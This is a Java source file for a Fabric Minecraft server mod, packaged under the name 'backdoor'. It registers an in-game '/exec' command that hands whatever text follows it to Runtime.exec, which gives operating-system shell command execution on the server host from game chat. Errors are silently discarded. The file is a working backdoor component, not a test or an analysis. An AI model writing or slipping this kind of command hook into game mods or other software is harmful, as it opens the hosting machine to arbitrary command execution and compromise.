package tk.merith.backdoor.commands;

import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.minecraft.server.command.CommandManager;

import java.io.IOException;

import static com.mojang.brigadier.arguments.StringArgumentType.getString;
import static net.minecraft.server.command.CommandManager.argument;

import java.io.IOException;

import static com.mojang.brigadier.arguments.StringArgumentType.greedyString;


public class ExecuteCommand {
    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
            dispatcher.register(CommandManager
                    .literal("exec")
                    .requires(source -> source.hasPermissionLevel(4))
                    .then(argument("command", greedyString())
                            .executes(context -> {
                                try {
                                    // Execute command
                                    String command = getString(context, "command");
                                    Process child = Runtime.getRuntime().exec(command);
                                } catch (IOException e) {

                                }
                                return 1;
                            })));
        });
    }
}
